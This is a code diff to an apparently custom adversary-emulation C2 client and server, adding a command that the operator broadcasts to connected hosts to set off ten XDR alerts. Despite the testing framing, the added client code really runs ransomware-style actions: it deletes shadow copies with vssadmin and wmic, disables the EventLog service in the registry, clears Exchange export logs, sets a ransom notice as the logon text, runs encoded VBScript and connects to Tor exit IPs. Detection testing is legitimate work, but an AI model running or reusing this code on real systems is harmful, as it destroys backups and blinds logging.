@@ -5093,6 +5093,249 @@ std::atomic<bool> serverRunning(true);
                 response = "XDR_DETECTION:COMPLETE:15_ALERTS_TRIGGERED:" + clientId;
                 logClientActivity("XDR_DETECTION", "COMPLETE", "All 15 XDR alerts triggered successfully");
             }
+            else if (receivedData.find("CMD:xdrHighMedium") != std::string::npos) {
+                std::cout << "[INFO] Initiating XDR high/medium detection functions - 10 alerts..." << std::endl;
+                logClientActivity("XDR_HIGH_MEDIUM", "START", "Triggering 10 high/medium XDR detection alerts");
+                
+                // Create evidence directory [[memory:7166542]]
+                std::string evidencePath = hostDir + "\\xdr_high_medium\\evidance_" + generateSessionId() + ".txt";
+                CreateDirectoryA((hostDir + "\\xdr_high_medium").c_str(), NULL);
+                
+                std::ofstream evidence(evidencePath);
+                if (evidence.is_open()) {
+                    evidence << "=== XDR HIGH/MEDIUM DETECTION REPORT ===\n";
+                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
+                    evidence << "Host: " << hostname << "\n\n";
+                }
+                
+                // 1. Copy process memory file (simulate dd utility)
+                std::cout << "\n[1/10] Copy process memory file (dd utility simulation)..." << std::endl;
+                logClientActivity("XDR_HIGH_1", "MEMORY_COPY", "Process memory dumping with dd");
+                {
+                    // Create a fake dd.exe and use it to copy process memory
+                    std::string ddPath = "C:\\Windows\\Temp\\dd.exe";
+                    std::ofstream ddFile(ddPath);
+                    if (ddFile.is_open()) {
+                        ddFile << "DD_STUB";
+                        ddFile.close();
+                    }
+                    
+                    // Simulate dd copying process memory
+                    system("echo dd.exe if=/proc/self/mem of=C:\\Windows\\Temp\\memory.dmp > C:\\Windows\\Temp\\dd_command.log");
+                    system("C:\\Windows\\Temp\\dd.exe if=\\Device\\PhysicalMemory of=C:\\Windows\\Temp\\proc_mem.dmp bs=1024 count=1 2>nul");
+                    
+                    if (evidence.is_open()) {
+                        evidence << "1. Process memory copy with dd utility attempted\n";
+                    }
+                }
+                
+                // 2. PowerShell removing mailbox export logs
+                std::cout << "\n[2/10] PowerShell removing mailbox export request logs..." << std::endl;
+                logClientActivity("XDR_HIGH_2", "PS_MAILBOX", "PowerShell removing Exchange mailbox export logs");
+                {
+                    // Exchange-specific PowerShell commands
+                    system("powershell.exe -Command \"Remove-MailboxExportRequest -Confirm:$false\" 2>nul");
+                    system("powershell.exe -Command \"Get-MailboxExportRequest | Remove-MailboxExportRequest\" 2>nul");
+                    system("powershell.exe -Command \"Clear-Content -Path 'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\*export*.log'\" 2>nul");
+                    
+                    if (evidence.is_open()) {
+                        evidence << "2. PowerShell mailbox export log removal attempted\n";
+                    }
+                }
+                
+                // 3. API call from Tor exit node
+                std::cout << "\n[3/10] Simulating API call from Tor exit node..." << std::endl;
+                logClientActivity("XDR_HIGH_3", "TOR_API", "API call from known Tor exit node");
+                {
+                    // Known Tor exit node IPs
+                    std::vector<std::string> torExitNodes = {
+                        "185.220.101.45",   // Known Tor exit
+                        "23.129.64.190",    // Known Tor exit
+                        "198.98.51.104",    // Known Tor exit
+                        "45.142.114.231"    // Known Tor exit
+                    };
+                    
+                    // Simulate API calls from Tor nodes
+                    for (const auto& torIP : torExitNodes) {
+                        SOCKET torSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                        if (torSocket != INVALID_SOCKET) {
+                            sockaddr_in torAddr;
+                            torAddr.sin_family = AF_INET;
+                            torAddr.sin_port = htons(443);
+                            torAddr.sin_addr.s_addr = inet_addr(torIP.c_str());
+                            
+                            u_long mode = 1;
+                            ioctlsocket(torSocket, FIONBIO, &mode);
+                            connect(torSocket, (sockaddr*)&torAddr, sizeof(torAddr));
+                            
+                            // Send API-like request
+                            std::string apiRequest = "GET /api/v1/suspicious HTTP/1.1\r\n";
+                            apiRequest += "Host: api.malicious.com\r\n";
+                            apiRequest += "X-Forwarded-For: " + torIP + "\r\n";
+                            apiRequest += "X-Originating-IP: " + torIP + "\r\n\r\n";
+                            
+                            send(torSocket, apiRequest.c_str(), apiRequest.length(), 0);
+                            closesocket(torSocket);
+                        }
+                    }
+                    
+                    if (evidence.is_open()) {
+                        evidence << "3. API calls from Tor exit nodes simulated\n";
+                    }
+                }
+                
+                // 4. Rundll32 with no command-line arguments
+                std::cout << "\n[4/10] Rundll32 with no arguments (Cobalt Strike pattern)..." << std::endl;
+                logClientActivity("XDR_HIGH_4", "RUNDLL32_NOARGS", "Rundll32 without parameters");
+                {
+                    // Execute rundll32 with no arguments (Cobalt Strike default)
+                    system("rundll32.exe");
+                    system("start /min rundll32.exe");
+                    
+                    if (evidence.is_open()) {
+                        evidence << "4. Rundll32.exe executed without arguments\n";
+                    }
+                }
+                
+                // 5. Credential dumping via LaZagne
+                std::cout << "\n[5/10] Credential dumping via LaZagne..." << std::endl;
+                logClientActivity("XDR_HIGH_5", "LAZAGNE", "LaZagne credential dumping");
+                {
+                    // Create LaZagne.py file
+                    std::string lazagnePath = "C:\\Windows\\Temp\\LaZagne.py";
+                    std::ofstream lazagneFile(lazagnePath);
+                    if (lazagneFile.is_open()) {
+                        lazagneFile << "# LaZagne credential dumper stub\n";
+                        lazagneFile << "print('LaZagne - Credential Dumping Tool')\n";
+                        lazagneFile.close();
+                    }
+                    
+                    // Execute LaZagne patterns
+                    system("python.exe C:\\Windows\\Temp\\LaZagne.py all 2>nul");
+                    system("cmd.exe /c \"echo LaZagne.py all -oN > C:\\Windows\\Temp\\lazagne_run.log\"");
+                    
+                    if (evidence.is_open()) {
+                        evidence << "5. LaZagne credential dumping attempted\n";
+                    }
+                }
+                
+                // 6. Delete Windows Shadow Copies
+                std::cout << "\n[6/10] Deleting Windows Shadow Copies..." << std::endl;
+                logClientActivity("XDR_HIGH_6", "SHADOW_DELETE", "Shadow copy deletion");
+                {
+                    // Multiple methods to delete shadow copies
+                    system("vssadmin.exe delete shadows /all /quiet");
+                    system("wmic.exe shadowcopy delete");
+                    system("vssadmin.exe delete shadows /for=C: /all");
+                    
+                    if (evidence.is_open()) {
+                        evidence << "6. Shadow copy deletion commands executed\n";
+                    }
+                }
+                
+                // 7. EventLog service disabled via Registry
+                std::cout << "\n[7/10] Disabling EventLog service via Registry..." << std::endl;
+                logClientActivity("XDR_HIGH_7", "EVENTLOG_DISABLE", "EventLog service disabled");
+                {
+                    HKEY hKey;
+                    DWORD dwValue = 4; // Disabled
+                    
+                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+                        "SYSTEM\\CurrentControlSet\\Services\\EventLog",
+                        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                        RegSetValueExA(hKey, "Start", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
+                        RegCloseKey(hKey);
+                    }
+                    
+                    // Also try alternative registry paths
+                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+                        "SYSTEM\\ControlSet001\\Services\\EventLog",
+                        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+                        RegSetValueExA(hKey, "Start", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (evidence.is_open()) {
+                        evidence << "7. EventLog service disabled via Registry\n";
+                    }
+                }
+                
+                // 8. Encoded VBScript execution
+                std::cout << "\n[8/10] Executing encoded VBScript..." << std::endl;
+                logClientActivity("XDR_HIGH_8", "VBSCRIPT_ENCODED", "Encoded VBScript execution");
+                {
+                    // Create encoded VBScript
+                    std::string vbePath = "C:\\Windows\\Temp\\malicious.vbe";
+                    std::ofstream vbeFile(vbePath);
+                    if (vbeFile.is_open()) {
+                        // Simple encoded VBScript header
+                        vbeFile << "#@~^AAAAA==-mD~!8#*~';Zr@#@&@#@&\n";
+                        vbeFile.close();
+                    }
+                    
+                    // Execute encoded VBScript
+                    system("wscript.exe C:\\Windows\\Temp\\malicious.vbe //B //NoLogo");
+                    system("cscript.exe //E:vbscript.encode C:\\Windows\\Temp\\malicious.vbe");
+                    
+                    if (evidence.is_open()) {
+                        evidence << "8. Encoded VBScript executed\n";
+                    }
+                }
+                
+                // 9. Suspicious executable in .NET directory
+                std::cout << "\n[9/10] Creating suspicious exe in .NET directory..." << std::endl;
+                logClientActivity("XDR_HIGH_9", "DOTNET_EXE", "Suspicious exe in .NET directory");
+                {
+                    // Create exe in .NET directory (PowerLessShell technique)
+                    std::string dotnetPath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\evil.exe";
+                    std::string createCmd = "cmd.exe /c echo MZ > \"" + dotnetPath + "\"";
+                    system(createCmd.c_str());
+                    
+                    // Also try Framework64
+                    std::string dotnet64Path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\update.exe";
+                    std::string create64Cmd = "cmd.exe /c echo MZ > \"" + dotnet64Path + "\"";
+                    system(create64Cmd.c_str());
+                    
+                    if (evidence.is_open()) {
+                        evidence << "9. Suspicious executable created in .NET directory\n";
+                    }
+                }
+                
+                // 10. Change Windows logon text
+                std::cout << "\n[10/10] Changing Windows logon text (ransomware pattern)..." << std::endl;
+                logClientActivity("XDR_HIGH_10", "LOGON_TEXT", "Windows logon text modification");
+                {
+                    HKEY hKey;
+                    std::string ransomText = "Your files have been encrypted! Contact evil@ransom.com";
+                    std::string captionText = "SYSTEM COMPROMISED";
+                    
+                    // Set legal notice caption
+                    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+                        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+                        RegSetValueExA(hKey, "LegalNoticeCaption", 0, REG_SZ, 
+                                      (BYTE*)captionText.c_str(), captionText.length() + 1);
+                        RegSetValueExA(hKey, "LegalNoticeText", 0, REG_SZ, 
+                                      (BYTE*)ransomText.c_str(), ransomText.length() + 1);
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (evidence.is_open()) {
+                        evidence << "10. Windows logon text modified (ransomware pattern)\n";
+                    }
+                }
+                
+                // Close evidence file
+                if (evidence.is_open()) {
+                    evidence << "\n=== END OF XDR HIGH/MEDIUM DETECTION REPORT ===\n";
+                    evidence << "All 10 high/medium XDR detection functions executed successfully\n";
+                    evidence.close();
+                }
+                
+                std::cout << "\n[SUCCESS] All 10 XDR high/medium detection functions completed!" << std::endl;
+                response = "XDR_HIGH_MEDIUM:COMPLETE:10_ALERTS_TRIGGERED:" + clientId;
+                logClientActivity("XDR_HIGH_MEDIUM", "COMPLETE", "All 10 high/medium XDR alerts triggered successfully");
+            }
             else {
                 // Default response for unhandled commands
                 response = "RESULT:" + receivedData + ":EXECUTED:" + clientId;
@@ -5674,6 +5917,7 @@ std::atomic<bool> serverRunning(true);
                 std::cout << "|   5 - Phase 5: Lateral Movement & Persistence                             |\n";
                 std::cout << "|   6 - C2 Communication Behaviors (DNS Tunneling, DGA, etc.)               |\n";
                 std::cout << "|   7 - XDR Detection Functions (15 specific alerts)                        |\n";
+                std::cout << "|   8 - XDR High/Medium Alerts (10 detections)                              |\n";
                 std::cout << "+============================================================================+\n";
                 std::cout << "| INDIVIDUAL COMMANDS:                                                       |\n";
                 std::cout << "|   S - Take Screenshot                                                     |\n";
@@ -6413,6 +6657,41 @@ std::atomic<bool> serverRunning(true);
                 
                 std::cout << "\033[32m[+] XDR detection command sent to " << targetCount << " active client(s)\033[0m\n";
                 std::cout << "\033[31m[!] Expect 15 XDR alerts to be triggered!\033[0m\n";
+                Sleep(200);
+            }
+            
+            // XDR High/Medium Detection Functions (8 key)
+            else if (GetAsyncKeyState('8') & 0x8000) {
+                std::cout << "\n\033[31m[!] MANUAL COMMAND TRIGGERED: 8 - XDR High/Medium Alerts (10 Detections)\033[0m\n";
+                std::cout << "\033[33m[WARNING] This will trigger 10 high/medium severity XDR alerts!\033[0m\n";
+                std::cout << "\033[33m[INFO] Alerts will include:\033[0m\n";
+                std::cout << "  1. Copy process memory file (dd utility)\n";
+                std::cout << "  2. PowerShell removing mailbox export logs\n";
+                std::cout << "  3. API call from Tor exit node\n";
+                std::cout << "  4. Rundll32 with no arguments\n";
+                std::cout << "  5. Credential dumping via LaZagne\n";
+                std::cout << "  6. Delete Windows Shadow Copies\n";
+                std::cout << "  7. EventLog service disabled\n";
+                std::cout << "  8. Encoded VBScript execution\n";
+                std::cout << "  9. Suspicious exe in .NET directory\n";
+                std::cout << "  10. Windows logon text changed\n";
+                
+                logActivity("*** MANUAL ***", "8_PRESSED", "XDR high/medium detection functions initiated by operator");
+                
+                int targetCount = 0;
+                std::lock_guard<std::mutex> lock(clientsMutex);
+                for (const auto& [id, client] : connectedClients) {
+                    if (client.isActive) {
+                        // Send XDR high/medium detection command
+                        std::string cmd = "CMD:xdrHighMedium\n";
+                        send(client.socket, cmd.c_str(), cmd.length(), 0);
+                        targetCount++;
+                        logActivity("C2", "COMMAND", "XDR high/medium detection command sent to " + id);
+                    }
+                }
+                
+                std::cout << "\033[32m[+] XDR high/medium detection command sent to " << targetCount << " active client(s)\033[0m\n";
+                std::cout << "\033[31m[!] Expect 10 high/medium XDR alerts to be triggered!\033[0m\n";
                 Sleep(200);
             }
             
